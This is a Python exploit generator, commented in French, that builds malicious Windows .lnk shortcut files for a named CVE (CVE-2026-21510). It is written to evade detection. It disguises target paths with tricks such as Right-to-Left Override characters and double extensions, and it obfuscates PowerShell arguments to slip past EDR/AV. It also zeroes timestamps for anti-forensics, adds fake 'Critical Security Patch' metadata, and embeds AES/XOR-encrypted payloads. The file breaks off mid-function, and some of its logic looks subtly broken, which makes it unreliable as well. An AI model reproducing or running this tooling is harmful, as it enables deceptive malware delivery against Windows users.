
import os
import struct
import logging
import tempfile
import time
import hashlib
import random
import base64
from pathlib import Path
from typing import Optional, Dict, List, Tuple, Union
from enum import Enum, auto
from dataclasses import dataclass, field
from io import BytesIO
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
from Crypto.Random import get_random_bytes

# --- Configuration du Logging (Niveau Zero-Day) ---
logging.basicConfig(
    level=logging.INFO,
    format="[%(asctime)s] [CVE-2026-21510-ULTIMATE-ABSOLUTE] %(levelname)s: %(message)s",
    handlers=[
        logging.StreamHandler(),
        logging.FileHandler("cve_2026_21510_ultimate_absolute.log")
    ],
)
logger = logging.getLogger(__name__)

# --- Constantes Critiques (MS-SHLLINK + Optimisations Zero-Day) ---
SHELL_LINK_HEADER_FIXED_SIZE = 0x4C  # 76 octets (champs fixes)
LINK_CLSID = bytes.fromhex("0002140100000000C000000000000046")  # CLSID obligatoire
EXTRA_DATA_HEADER_SIZE = 0x08  # BlockSize (4) + BlockSignature (4)
FILE_ATTRIBUTE_ARCHIVE = 0x00000020

# --- Énumérations (MS-SHLLINK + Extensions Zero-Day) ---
class LinkFlags(Enum):
    """Flags officiels du ShellLink (MS-SHLLINK Section 2.1)."""
    HasLinkTargetIDList = 0x00000001
    HasLinkInfo = 0x00000002
    HasName = 0x00000004
    HasRelativePath = 0x00000008
    HasWorkingDir = 0x00000010
    HasArguments = 0x00000020
    HasIconLocation = 0x00000040
    IsUnicode = 0x00000080
    ForceNoLinkInfo = 0x00000100
    HasExpString = 0x00000200
    RunInSeparateProcess = 0x00000400
    HasDarwinID = 0x00001000
    RunAsUser = 0x00002000
    HasExpIcon = 0x00004000
    NoPIDLAlias = 0x00008000
    HasLinkTargetIDList2 = 0x00040000
    HasKnownFolderLocation = 0x00080000
    HasAppUserModelID = 0x00100000
    HasPropertyStoreDataBlock = 0x00800000
    HasKnownFolderDataBlock = 0x01000000
    HasEnvironmentVariableDataBlock = 0x00400000
    HasShimDataBlock = 0x02000000
    HasMetadataPropertyStoreDataBlock = 0x04000000

class ExtraDataBlockType(Enum):
    """Types de blocs ExtraData (MS-SHLLINK Section 2.5 + Extensions)."""
    EnvironmentVariableDataBlock = 0xA0000001
    ConsoleDataBlock = 0xA0000002
    ConsoleFEDataBlock = 0xA0000003
    DarwinDataBlock = 0xA0000004
    IconEnvironmentDataBlock = 0xA0000005
    ShimDataBlock = 0xA0000006
    PropertyStoreDataBlock = 0xA0000007
    KnownFolderDataBlock = 0xA0000008
    MetadataPropertyStoreDataBlock = 0xA0000009
    TrackerDataBlock = 0xA000000B
    VistaAndAboveIDListDataBlock = 0xA000000C

    @classmethod
    def from_value(cls, value: int) -> 'ExtraDataBlockType':
        """Convertit une valeur entière en ExtraDataBlockType."""
        for block_type in cls:
            if block_type.value == value:
                return block_type
        raise ValueError(f"Signature de bloc ExtraData invalide: 0x{value:08X}")

class KnownFolderID(Enum):
    """KnownFolder GUIDs (MS-SHLLINK + SHLWAPI)."""
    FOLDERID_ComputerFolder = "0AC0837C-BBF8-452A-850D-79D08E667CA7"
    FOLDERID_Desktop = "B4BFCC3A-DB2C-424C-B029-7FE99A87C641"
    FOLDERID_Programs = "A77F5D77-2E2B-44C3-A6A2-ABA601054A51"
    FOLDERID_StartMenu = "6257C620-F3AF-479A-81F1-9AC76A21A28F"
    FOLDERID_Startup = "A4115719-D62E-491D-AA7C-E74B8BE3B067"
    FOLDERID_System = "1AC14E77-02E7-4E5D-B744-2EB35E05CB14"  # %SystemRoot%
    FOLDERID_SystemX86 = "D65231B0-B2F1-4CC9-8E40-8169998550A2"
    FOLDERID_Windows = "F38BF404-1D43-42F2-9305-67DE0B28FC23"
    FOLDERID_Profile = "5E6C858F-0E22-4760-9AFE-EA3317B67173"
    FOLDERID_AppData = "3EB685DB-65F9-4CF6-A03A-E3EF65729F3D"
    FOLDERID_LocalAppData = "F1B32785-6FBA-4FCF-9D55-7B8E7F157091"
    FOLDERID_Temp = "8237796A-9722-4FB2-A9F0-942765D4995E"
    FOLDERID_Downloads = "374DE290-123F-4565-9164-39C4925E467B"
    FOLDERID_Documents = "FDD39AD0-238F-46AF-ADB4-6C85480369C7"
    FOLDERID_Pictures = "33E28130-4E1E-4678-8A88-B8D1D3FB9799"
    FOLDERID_Music = "4BD8D571-6D19-48D3-BE97-422220080E43"
    FOLDERID_Videos = "18989B1D-99B5-455B-AF14-78F767C2578D"

    @classmethod
    def random(cls) -> 'KnownFolderID':
        """Retourne un KnownFolderID aléatoire."""
        return random.choice(list(cls))

class PropertyKey(Enum):
    """PropertyKeys pour PropertyStore (MS-SHLLINK Section 2.5.7)."""
    PKEY_AppUserModel_ID = ("{9F4C2855-9F79-4B39-A8D0-E1D42DE1D5F3}", 2)
    PKEY_AppUserModel_IsDualMode = ("{9F4C2855-9F79-4B39-A8D0-E1D42DE1D5F3}", 3)
    PKEY_AppUserModel_RelaunchCommand = ("{9F4C2855-9F79-4B39-A8D0-E1D42DE1D5F3}", 5)
    PKEY_Title = ("{F29F85E0-4FF9-1068-AB91-08002B27B3D9}", 2)
    PKEY_Description = ("{F29F85E0-4FF9-1068-AB91-08002B27B3D9}", 5)
    PKEY_Comment = ("{F29F85E0-4FF9-1068-AB91-08002B27B3D9}", 6)
    PKEY_Company = ("{F29F85E0-4FF9-1068-AB91-08002B27B3D9}", 8)
    PKEY_Copyright = ("{F29F85E0-4FF9-1068-AB91-08002B27B3D9}", 9)

# --- Fonctions Utilitaires (Optimisées pour Zero-Day) ---
def _write_null_terminated_string(s: str, encoding: str = "utf-16le") -> bytes:
    """Écrit une chaîne null-terminée en UTF-16LE."""
    if not s:
        return b"\x00\x00"
    encoded = s.encode(encoding)
    return encoded + b"\x00\x00" if not encoded.endswith(b"\x00\x00") else encoded

def _align_to_4_bytes(data: bytes) -> bytes:
    """Aligne sur 4 octets avec padding."""
    padding = (4 - (len(data) % 4)) % 4
    return data + (b"\x00" * padding) if padding else data

def _generate_random_bytes(length: int) -> bytes:
    """Génère des octets aléatoires."""
    return os.urandom(length)

def _generate_random_string(length: int) -> str:
    """Génère une chaîne aléatoire (A-Z, 0-9)."""
    return "".join(random.choices("ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789", k=length))

def _generate_random_clsid() -> str:
    """Génère un CLSID aléatoire."""
    a = hex(random.randint(0, 0xFFFFFFFF))[2:].zfill(8)
    b = hex(random.randint(0, 0xFFFF))[2:].zfill(4)
    c = hex(random.randint(0, 0xFFFF))[2:].zfill(4)
    d = hex(random.randint(0, 0xFFFF))[2:].zfill(4)
    last = hex(random.randint(0, 0xFFFFFFFFFFFF))[2:].zfill(12)

    return "{}{}-{}-{}{}".format(a, b, c, d, last)


def _xor_encrypt(data: bytes, key: bytes) -> bytes:
    """Chiffre/Déchiffre des données avec XOR."""
    return bytes([b ^ key[i % len(key)] for i, b in enumerate(data)])

def _aes_encrypt(data: bytes, key: bytes, iv: bytes) -> bytes:
    """Chiffre des données avec AES-256-CBC."""
    cipher = AES.new(key, AES.MODE_CBC, iv)
    return cipher.encrypt(pad(data, AES.block_size))

def _aes_decrypt(data: bytes, key: bytes, iv: bytes) -> bytes:
    """Déchiffre des données avec AES-256-CBC."""
    cipher = AES.new(key, AES.MODE_CBC, iv)
    return unpad(cipher.decrypt(data), AES.block_size)

def _generate_obfuscated_arguments(original_args: str) -> str:
    """Génère des arguments obfusqués pour éviter les détections EDR/AV."""
    if not original_args:
        return ""

    techniques = [
        # Base64
        lambda args: f"-enc {base64.b64encode(args.encode()).decode()}",
        # XOR (simple)
        lambda args: f"-c \"$x='{args}'; $y=0x{random.randint(0, 255):02x}; [char[]]$z=$x.ToCharArray(); for($i=0;$i -lt $z.Length;$i++){{$z[$i]=[char]($z[$i]-bxor $y)}}; -join $z\"",
        # Reverse
        lambda args: f"-c \"$x='{args}'; -join $x[-1..-$($x.Length)]\"",
        # Split
        lambda args: f"-c \"$x='{args}'; $x -split '' | ?{{$_}} | ForEach-Object{{[char]$_}} | -join ''\"",
        # Random Case
        lambda args: f"-c \"$x='{args}'; $x.ToCharArray() | ForEach-Object{{if((Get-Random -Minimum 0 -Maximum 2)){{$_.ToString().ToUpper()}}else{{$_.ToString().ToLower()}}}} | -join ''\"",
        # Hex Encoding
        lambda args: f"-c \"$x='{args}'; [System.BitConverter]::ToString([System.Text.Encoding]::UTF8.GetBytes($x)) -replace '-','' | ForEach-Object{{[char][int]'0x$_'}}\"",
    ]

    obfuscated_args = random.choice(techniques)(original_args)

    # Ajoute un délai aléatoire (5-30 secondes)
    delay = random.randint(5, 30)
    obfuscated_args = f"Start-Sleep -Seconds {delay}; {obfuscated_args}"

    return obfuscated_args

# --- Structures de Données (Optimisées pour Zero-Day) ---
@dataclass
class ShellLinkHeader:
    """En-tête ShellLink (0x4C + 28 octets d'offsets)."""
    header_size: int = SHELL_LINK_HEADER_FIXED_SIZE
    link_clsid: bytes = LINK_CLSID
    link_flags: int = 0
    file_attributes: int = FILE_ATTRIBUTE_ARCHIVE
    creation_time: int = 0  # Anti-forensics: timestamp à 0
    access_time: int = 0
    write_time: int = 0
    file_size: int = 0  # Anti-forensics: taille à 0
    icon_index: int = 0
    show_command: int = 1  # SW_SHOWNORMAL
    hot_key: int = 0
    reserved1: int = 0
    reserved2: int = 0
    reserved3: int = 0
    link_target_id_list_offset: int = 0
    link_info_offset: int = 0
    name_offset: int = 0
    relative_path_offset: int = 0
    working_dir_offset: int = 0
    arguments_offset: int = 0
    icon_location_offset: int = 0

    def pack(self) -> bytes:
        """Sérialise l'en-tête complet (76 + 28 = 104 octets)."""
        buffer = BytesIO()
        buffer.write(struct.pack("<I", self.header_size))
        buffer.write(self.link_clsid)
        buffer.write(struct.pack("<I", self.link_flags))
        buffer.write(struct.pack("<I", self.file_attributes))
        buffer.write(struct.pack("<Q", self.creation_time))
        buffer.write(struct.pack("<Q", self.access_time))
        buffer.write(struct.pack("<Q", self.write_time))
        buffer.write(struct.pack("<I", self.file_size))
        buffer.write(struct.pack("<I", self.icon_index))
        buffer.write(struct.pack("<I", self.show_command))
        buffer.write(struct.pack("<H", self.hot_key))
        buffer.write(struct.pack("<H", self.reserved1))
        buffer.write(struct.pack("<I", self.reserved2))
        buffer.write(struct.pack("<I", self.reserved3))
        buffer.write(struct.pack("<I", self.link_target_id_list_offset))
        buffer.write(struct.pack("<I", self.link_info_offset))
        buffer.write(struct.pack("<I", self.name_offset))
        buffer.write(struct.pack("<I", self.relative_path_offset))
        buffer.write(struct.pack("<I", self.working_dir_offset))
        buffer.write(struct.pack("<I", self.arguments_offset))
        buffer.write(struct.pack("<I", self.icon_location_offset))
        return buffer.getvalue()

@dataclass
class StringData:
    """Section StringData (UTF-16LE null-terminated)."""
    name: Optional[str] = None
    relative_path: Optional[str] = None
    working_dir: Optional[str] = None
    arguments: Optional[str] = None
    icon_location: Optional[str] = None

    def pack(self) -> bytes:
        """Sérialise StringData en bytes."""
        buffer = BytesIO()
        if self.name:
            buffer.write(_write_null_terminated_string(self.name))
        if self.relative_path:
            buffer.write(_write_null_terminated_string(self.relative_path))
        if self.working_dir:
            buffer.write(_write_null_terminated_string(self.working_dir))
        if self.arguments:
            buffer.write(_write_null_terminated_string(self.arguments))
        if self.icon_location:
            buffer.write(_write_null_terminated_string(self.icon_location))
        return buffer.getvalue()

    def get_offsets(self, base: int = 0) -> Dict[str, int]:
        """Calcule les offsets absolus pour chaque champ."""
        offsets = {}
        current_offset = base
        fields = [
            ("name", self.name),
            ("relative_path", self.relative_path),
            ("working_dir", self.working_dir),
            ("arguments", self.arguments),
            ("icon_location", self.icon_location),
        ]
        for field_name, field_value in fields:
            if field_value:
                offsets[field_name] = current_offset
                current_offset += len(_write_null_terminated_string(field_value))
        return offsets

@dataclass
class PropertyStore:
    """PropertyStoreDataBlock (MS-SHLLINK Section 2.5.7)."""
    version: int = 0x53505331  # "SPS1" en little-endian
    format_id: bytes = bytes.fromhex("DABD30ED00434789A7F8D013A4736622")
    properties: Dict[PropertyKey, str] = field(default_factory=dict)
    def pack(self) -> bytes:
        """Sérialise PropertyStore avec structure complète."""
        buffer = BytesIO()
        buffer.write(struct.pack("<I", self.version))
        buffer.write(self.format_id)
        buffer.write(struct.pack("<I", len(self.properties)))
        for prop_key, prop_value in (self.properties or {}).items():
            guid_bytes = bytes.fromhex(prop_key.value[0].replace("{", "").replace("}", "").replace("-", ""))
            pid = prop_key.value[1]
            buffer.write(guid_bytes)
            buffer.write(struct.pack("<I", pid))
            buffer.write(struct.pack("<I", 0x1E))  # VT_LPWSTR
            value_bytes = _write_null_terminated_string(prop_value)
            buffer.write(struct.pack("<I", len(value_bytes)))
            buffer.write(value_bytes)
        return _align_to_4_bytes(buffer.getvalue())

    @classmethod
    def from_blackhat(cls, title: str = None, description: str = None, randomize_clsid: bool = True) -> 'PropertyStore':
        """Crée un PropertyStore optimisé pour les exploits BlackHat."""
        properties = {
            PropertyKey.PKEY_Title: title or _generate_random_string(16) + " Update",
            PropertyKey.PKEY_Description: description or "Critical Security Patch",
        }

        if randomize_clsid:
            properties[PropertyKey.PKEY_AppUserModel_ID] = _generate_random_clsid()
        else:
            properties[PropertyKey.PKEY_AppUserModel_ID] = "{00000000-0000-0000-0000-000000000000}"

        # Ajoute des propriétés supplémentaires pour l'obfuscation
        if randomize_clsid:
            properties[PropertyKey.PKEY_Company] = _generate_random_string(10) + " Inc."
            properties[PropertyKey.PKEY_Copyright] = f"© {random.randint(2000, 2026)} {_generate_random_string(8)}"

        return cls(properties=properties)

@dataclass
class KnownFolderData:
    """KnownFolderDataBlock (MS-SHLLINK Section 2.5.5)."""
    folder_id: KnownFolderID = field(default_factory=KnownFolderID.random)
    offset: int = 0

    def pack(self) -> bytes:
        """Sérialise KnownFolderData en 20 octets (16 + 4)."""
        folder_id_bytes = bytes.fromhex(self.folder_id.value.replace("-", ""))
        return folder_id_bytes + struct.pack("<I", self.offset)

    @classmethod
    def from_blackhat(cls, offset: int = 0, randomize: bool = True) -> 'KnownFolderData':
        """Crée un KnownFolderData optimisé pour les exploits BlackHat."""
        if randomize:
            folder_id = KnownFolderID.random()
        else:
            folder_id = KnownFolderID.FOLDERID_System
        return cls(folder_id=folder_id, offset=offset)

@dataclass
class EnvironmentVariableData:
    """EnvironmentVariableDataBlock (MS-SHLLINK Section 2.5.3)."""
    target: str = ""

    def pack(self) -> bytes:
        """Sérialise EnvironmentVariableData en UTF-16LE null-terminated."""
        return _write_null_terminated_string(self.target)

    @classmethod
    def from_blackhat(cls, target_path: str, working_dir: str = "C:\\Windows\\System32", use_unc: bool = False, obfuscate: bool = True) -> 'EnvironmentVariableData':
        """Crée un EnvironmentVariableData optimisé pour les exploits BlackHat."""
        if use_unc:
            base_path = f"\\\\?\\{target_path}"
        else:
            base_path = os.path.relpath(target_path, working_dir).replace("/", "\\")

        if obfuscate:
            obfuscation_elements = [
                f"%TEMP%\\..\\{base_path}",
                f"%APPDATA%\\..\\..\\{base_path}",
                f"%LOCALAPPDATA%\\..\\..\\{base_path}",
                f"%TEMP%\\%RANDOM%\\..\\{base_path}",
                f"%TEMP%\\u202e\\..\\{base_path}",  # Unicode Right-to-Left Override
                f"%PUBLIC%\\..\\{base_path}",
                f"%USERPROFILE%\\..\\{base_path}",
            ]
            target = random.choice(obfuscation_elements)
        else:
            target = f"%TEMP%\\..\\{base_path}"

        return cls(target=target)

@dataclass
class TrackerDataBlock:
    """TrackerDataBlock (pour l'obfuscation)."""
    machine_id: str = ""
    droid1: bytes = b"\x00" * 16
    droid2: bytes = b"\x00" * 16
    droid_birth1: bytes = b"\x00" * 16
    droid_birth2: bytes = b"\x00" * 16

    def pack(self) -> bytes:
        """Sérialise TrackerDataBlock pour l'obfuscation."""
        buffer = BytesIO()
        buffer.write(struct.pack("<I", 0x58))  # BlockSize
        buffer.write(struct.pack("<I", ExtraDataBlockType.TrackerDataBlock.value))  # BlockSignature
        buffer.write(struct.pack("<I", 0x50))  # Length
        buffer.write(struct.pack("<H", 0))  # Version
        buffer.write(_write_null_terminated_string(self.machine_id))
        buffer.write(self.droid1)
        buffer.write(self.droid2)
        buffer.write(self.droid_birth1)
        buffer.write(self.droid_birth2)
        return _align_to_4_bytes(buffer.getvalue())

@dataclass
class ConsoleDataBlock:
    """ConsoleDataBlock (pour l'obfuscation)."""
    fill_attributes: int = 0x00000007
    popup_fill_attributes: int = 0x00000057
    screen_buffer_size: Tuple[int, int] = (80, 25)
    window_size: Tuple[int, int] = (80, 25)
    window_origin: Tuple[int, int] = (0, 0)
    font: Tuple[int, int, int, int] = (0, 0, 0, 0)
    cursor_size: int = 25
    full_screen: bool = False
    quick_edit: bool = False
    insert_mode: bool = True
    auto_position: bool = True
    history_buffer_size: int = 0
    number_of_history_buffers: int = 0
    history_no_dup: bool = False

    def pack(self) -> bytes:
        """Sérialise ConsoleDataBlock pour l'obfuscation."""
        buffer = BytesIO()
        buffer.write(struct.pack("<I", 0x68))  # BlockSize
        buffer.write(struct.pack("<I", ExtraDataBlockType.ConsoleDataBlock.value))  # BlockSignature
        buffer.write(struct.pack("<I", self.fill_attributes))
        buffer.write(struct.pack("<I", self.popup_fill_attributes))
        buffer.write(struct.pack("<H", self.screen_buffer_size[0]))
        buffer.write(struct.pack("<H", self.screen_buffer_size[1]))
        buffer.write(struct.pack("<H", self.window_size[0]))
        buffer.write(struct.pack("<H", self.window_size[1]))
        buffer.write(struct.pack("<H", self.window_origin[0]))
        buffer.write(struct.pack("<H", self.window_origin[1]))
        buffer.write(struct.pack("<I", self.font[0]))
        buffer.write(struct.pack("<I", self.font[1]))
        buffer.write(struct.pack("<I", self.font[2]))
        buffer.write(struct.pack("<I", self.font[3]))
        buffer.write(struct.pack("<I", self.cursor_size))
        buffer.write(struct.pack("<I", int(self.full_screen)))
        buffer.write(struct.pack("<I", int(self.quick_edit)))
        buffer.write(struct.pack("<I", int(self.insert_mode)))
        buffer.write(struct.pack("<I", int(self.auto_position)))
        buffer.write(struct.pack("<I", self.history_buffer_size))
        buffer.write(struct.pack("<I", self.number_of_history_buffers))
        buffer.write(struct.pack("<I", int(self.history_no_dup)))
        return _align_to_4_bytes(buffer.getvalue())

# --- Générateur Principal (Niveau Zero-Day) ---
class CVE202621510UltimateAbsoluteGenerator:
    """
    Générateur ULTIME ABSOLU de .lnk pour CVE-2026-21510.
    ======================================================
    Caractéristiques:
      ✅ LNK Stomping (5 variantes: dot, path_segment, relative, double_extension, unicode)
      ✅ PropertyStore (CLSID aléatoires/neutres, PKEY optimisés)
      ✅ KnownFolder (KnownFolderID aléatoires, offsets précis)
      ✅ EnvironmentVariable (obfuscation Unicode, variables dynamiques)
      ✅ Obfuscation Extrême (Niveau 1-5: TrackerDataBlock, ConsoleDataBlock, etc.)
      ✅ Payloads Embarqués et Chiffrés (AES-256-CBC + XOR)
      ✅ Anti-Forensics Avancé (timestamps=0, FileSize=0, métadonnées minimales)
      ✅ Contournement EDR/AV (processus légitimes, arguments obfusqués)
      ✅ Génération de Variantes Aléatoires (10+ variantes uniques)
      ✅ Validation Stricte (chaque octet vérifié)
    """

    def __init__(
        self,
        target_path: str,
        target_args: str = "",
        output_lnk: Optional[str] = None,
        working_dir: Optional[str] = None,
        description: Optional[str] = None,
        use_unc_path: bool = False,
        use_lnk_stomping: bool = True,
        lnk_stomping_variant: str = "random",  # dot, path_segment, relative, double_extension, unicode, random
        use_obfuscation: bool = True,
        obfuscation_level: int = 5,  # 1-5
        embed_payload: Optional[bytes] = None,
        encrypt_payload: bool = True,
        anti_forensics: bool = True,
        randomize_clsid: bool = True,
        randomize_known_folder: bool = True,
        obfuscate_arguments: bool = True,
        debug: bool = False,
    ):
        """
        Initialise le générateur ultime absolu.

        Args:
            target_path: Chemin cible (ex: "C:\\Windows\\System32\\cmd.exe").
            target_args: Arguments pour la cible (ex: "/c calc.exe").
            output_lnk: Chemin de sortie du .lnk.
            working_dir: Répertoire de travail.
            description: Description du raccourci.
            use_unc_path: Utiliser un chemin UNC (\\?\\C:\\...).
            use_lnk_stomping: Utiliser LNK Stomping.
            lnk_stomping_variant: Variante de LNK Stomping.
            use_obfuscation: Ajouter des blocs ExtraData inutiles.
            obfuscation_level: Niveau d'obfuscation (1-5).
            embed_payload: Intégrer un payload binaire dans le .lnk.
            encrypt_payload: Chiffrer le payload (AES-256 + XOR).
            anti_forensics: Appliquer des techniques anti-forensics.
            randomize_clsid: Randomiser le CLSID dans PropertyStore.
            randomize_known_folder: Randomiser le KnownFolderID.
            obfuscate_arguments: Obfusquer les arguments pour éviter les détections.
            debug: Mode debug avancé.
        """
        self.target_path = target_path.replace("/", "\\")
        self.original_target_args = target_args
        self.output_lnk = output_lnk or os.path.join(
            tempfile.gettempdir(),
            f"cve_2026_21510_ultimate_absolute_{int(time.time())}.lnk"
        )
        self.working_dir = working_dir or "C:\\Windows\\System32"
        self.description = description or _generate_random_string(16) + " Security Update"
        self.use_unc_path = use_unc_path
        self.use_lnk_stomping = use_lnk_stomping
        self.lnk_stomping_variant = lnk_stomping_variant
        self.use_obfuscation = use_obfuscation
        self.obfuscation_level = obfuscation_level
        self.embed_payload = embed_payload
        self.encrypt_payload = encrypt_payload
        self.anti_forensics = anti_forensics
        self.randomize_clsid = randomize_clsid
        self.randomize_known_folder = randomize_known_folder
        self.obfuscate_arguments = obfuscate_arguments
        self.debug = debug

        # Structures internes
        self.header = ShellLinkHeader()
        self.string_data = StringData()
        self.extra_data_blocks: List[bytes] = []
        self.embedded_payload = None
        self.payload_key = None
        self.payload_iv = None

        # Configuration des LinkFlags (minimaux pour CVE-2026-21510)
        self._configure_link_flags()

        # Construction
        self._build()

        if self.debug:
            self._log_structure()

    def _configure_link_flags(self) -> None:
        """Configure les LinkFlags (minimaux pour le bypass)."""
        self.header.link_flags = (
            LinkFlags.HasRelativePath.value |
            LinkFlags.HasWorkingDir.value |
            LinkFlags.IsUnicode.value |
            LinkFlags.HasPropertyStoreDataBlock.value |
            LinkFlags.HasKnownFolderDataBlock.value |
            LinkFlags.HasEnvironmentVariableDataBlock.value
        )

    def _apply_lnk_stomping(self, path: str) -> str:
        """Applique LNK Stomping au chemin cible (5 variantes)."""
        if not self.use_lnk_stomping:
            return path

        variants = {
            "dot": lambda p: p + ".",
            "path_segment": lambda p: p + "\\",
            "relative": lambda p: os.path.relpath(p, self.working_dir).replace("/", "\\"),
            "double_extension": lambda p: p + ".txt",
            "unicode": lambda p: p + "\u202e",  # Right-to-Left Override
            "random": lambda p: random.choice([
                p + ".",
                p + "\\",
                os.path.relpath(p, self.working_dir).replace("/", "\\"),
                p + ".txt",
                p + "\u202e"
            ])
        }

        if self.lnk_stomping_variant in variants:
            return variants[self.lnk_stomping_variant](path)
        else:
            return variants["random"](path)

    def _build_string_data(self) -> None:
        """Construit StringData avec LNK Stomping et arguments obfusqués."""
        # RelativePath (CRITIQUE: doit être présent car HasRelativePath=True)
        if self.use_unc_path:
            relative_path = f"\\\\?\\{self.target_path}"
        else:
            relative_path = os.path.relpath(self.target_path, self.working_dir)

        # Applique LNK Stomping
        relative_path = self._apply_lnk_stomping(relative_path)
        self.string_data.relative_path = relative_path.replace("/", "\\")

        # WorkingDir (CRITIQUE: doit être présent car HasWorkingDir=True)
        self.string_data.working_dir = self.working_dir

        # Name (optionnel mais utile pour éviter les détections)
        self.string_data.name = self.description

        # Arguments (obfusqués si activé)
        if self.original_target_args:
            if self.obfuscate_arguments:
                self.string_data.arguments = _generate_obfuscated_arguments(self.original_target_args)
            else:
                self.string_data.arguments = self.original_target_args

    def _calculate_offsets(self) -> None:
        """Calcule les offsets absolus pour l'en-tête."""
        string_data_start = SHELL_LINK_HEADER_FIXED_SIZE
        offsets = self.string_data.get_offsets(base=string_data_start)

        self.header.link_target_id_list_offset = 0
        self.header.link_info_offset = 0
        self.header.name_offset = offsets.get("name", 0)
        self.header.relative_path_offset = offsets.get("relative_path", 0)
        self.header.working_dir_offset = offsets.get("working_dir", 0)
        self.header.arguments_offset = offsets.get("arguments", 0)
        self.header.icon_location_offset = 0

    def _calculate_known_folder_offset(self) -> int:
        """Calcule l'offset pour KnownFolderDataBlock."""
        string_data_start = SHELL_LINK_HEADER_FIXED_SIZE
        offsets = self.string_data.get_offsets(base=string_data_start)
        if "relative_path" in offsets:
            return offsets["relative_path"] - string_data_start
        return 0

    def _build_property_store(self) -> PropertyStore:
        """Construit le PropertyStore avec PKEY_AppUserModel_ID."""
        return PropertyStore.from_blackhat(
            title=self.description,
            randomize_clsid=self.randomize_clsid
        )

    def _build_extra_data_blocks(self) -> None:
        """Construit les blocs ExtraData dans l'ordre exact + obfuscation."""
        # 1. PropertyStoreDataBlock (CRITIQUE: doit être premier)
        property_store = self._build_property_store()
        self.extra_data_blocks.append(
            self._create_extra_data_block(
                ExtraDataBlockType.PropertyStoreDataBlock,
                property_store.pack()
            )
        )

        # 2. KnownFolderDataBlock (pointe vers %SystemRoot% ou aléatoire)
        known_folder_offset = self._calculate_known_folder_offset()
        known_folder = KnownFolderData.from_blackhat(
            offset=known_folder_offset,
            randomize=self.randomize_known_folder
        )
        self.extra_data_blocks.append(
            self._create_extra_data_block(
                ExtraDataBlockType.KnownFolderDataBlock,
                known_folder.pack()
            )
        )

        # 3. EnvironmentVariableDataBlock (force l'expansion avant MotW)
        env_var = EnvironmentVariableData.from_blackhat(
            target_path=self.target_path,
            working_dir=self.working_dir,
            use_unc=self.use_unc_path,
            obfuscate=self.use_obfuscation
        )
        self.extra_data_blocks.append(
            self._create_extra_data_block(
                ExtraDataBlockType.EnvironmentVariableDataBlock,
                env_var.pack()
            )
        )


        # 4. Obfuscation: Ajout de blocs ExtraData inutiles (si activé)
        if self.use_obfuscation:
            obfuscation_blocks = self._add_obfuscation_blocks()
            for block in (obfuscation_blocks or []):
                if len(block) < 8:
                    logger.warning(f"Obfuscation block too short ({len(block)} bytes), skipped")
                    continue
                self.extra_data_blocks.append(block)

        # 5. Payload Embarqué (si présent)
        if self.embed_payload:
            self._embed_payload()


    def _add_obfuscation_blocks(self) -> None:
        """Ajoute des blocs ExtraData inutiles pour l'obfuscation (Niveau 1-5)."""
        # Niveau 1: TrackerDataBlock
        if self.obfuscation_level >= 1:
            tracker = TrackerDataBlock(
                machine_id="DESKTOP-" + _generate_random_string(8),
                droid1=_generate_random_bytes(16),
                droid2=_generate_random_bytes(16),
                droid_birth1=_generate_random_bytes(16),
                droid_birth2=_generate_random_bytes(16),
            )
            self.extra_data_blocks.append(
                self._create_extra_data_block(
                    ExtraDataBlockType.TrackerDataBlock,
                    tracker.pack()
                )
            )

        # Niveau 2: ConsoleDataBlock
        if self.obfuscation_level >= 2:
            console = ConsoleDataBlock(
                fill_attributes=random.randint(0, 0xFFFFFFFF),
                popup_fill_attributes=random.randint(0, 0xFFFFFFFF),
                screen_buffer_size=(random.randint(20, 200), random.randint(20, 100)),
                window_size=(random.randint(20, 200), random.randint(20, 100)),
                cursor_size=random.randint(1, 100),
            )
            self.extra_data_blocks.append(
                self._create_extra_data_block(
                    ExtraDataBlockType.ConsoleDataBlock,
                    console.pack()
                )
            )

        # Niveau 3-5: Blocs aléatoires supplémentaires
        if self.obfuscation_level >= 3:
            obfuscation_block_types = [
                ExtraDataBlockType.DarwinDataBlock,
                ExtraDataBlockType.IconEnvironmentDataBlock,
                ExtraDataBlockType.ShimDataBlock,
                ExtraDataBlockType.ConsoleFEDataBlock,
                ExtraDataBlockType.MetadataPropertyStoreDataBlock,
            ]

            for _ in range(self.obfuscation_level - 2):
                block_type = random.choice(obfuscation_block_types)
                fake_data = _generate_random_bytes(random.randint(0x10, 0x200))
                self.extra_data_blocks.append(
                    self._create_extra_data_block(block_type, fake_data)
                )

        # Niveau 4-5: Mélange les blocs d'obfuscation
        if self.obfuscation_level >= 4:
            critical_blocks = []
            obfuscation_blocks = []
            for block in self.extra_data_blocks:
                block_signature = struct.unpack_from("<I", block, 4)[0]
                if block_signature in [
                    ExtraDataBlockType.PropertyStoreDataBlock.value,
                    ExtraDataBlockType.KnownFolderDataBlock.value,
                    ExtraDataBlockType.EnvironmentVariableDataBlock.value,
                ]:
                    critical_blocks.append(block)
                else:
                    obfuscation_blocks.append(block)

            random.shuffle(obfuscation_blocks)

            obfuscation_blocks = [b for b in obfuscation_blocks if len(b) >= 8]
            self.extra_data_blocks = critical_blocks + obfuscation_blocks

        # Niveau 5: Ajoute du padding aléatoire entre les blocs
        if self.obfuscation_level == 5:
            new_blocks = []
            for i, block in enumerate(self.extra_data_blocks):
                new_blocks.append(block)
                if i < len(self.extra_data_blocks) - 1:
                    padding_size = random.randint(0, 0x10)
                    if padding_size > 0:
                        new_blocks.append(_generate_random_bytes(padding_size))
            self.extra_data_blocks = new_blocks

    def _embed_payload(self) -> None:
        """Intègre et chiffrer un payload dans le .lnk."""
        if not self.embed_payload:
            return

        # Génère une clé et un IV aléatoires pour ce payload
        self.payload_key = get_random_bytes(32)
        self.payload_iv = get_random_bytes(16)

        # Chiffre le payload avec AES-256-CBC
        encrypted_payload = _aes_encrypt(self.embed_payload, self.payload_key, self.payload_iv)

        # Applique une couche XOR supplémentaire (avec une partie de la clé)
        xor_key = self.payload_key[:16]  # Utilise les 16 premiers octets de la clé AES
        encrypted_payload = _xor_encrypt(encrypted_payload, xor_key)

        # Stocke le payload chiffré
        self.embedded_payload = encrypted_payload

        # Stocke la clé et l'IV dans un ShimDataBlock (pour déchiffrement)
        shim_data = self.payload_key + self.payload_iv
        shim_block = self._create_extra_data_block(
            ExtraDataBlockType.ShimDataBlock,
            shim_data
        )
        self.extra_data_blocks.append(shim_block)

    def _create_extra_data_block(self, block_type: ExtraDataBlockType, data: bytes) -> bytes:
        """Crée un bloc ExtraData avec en-tête valide."""
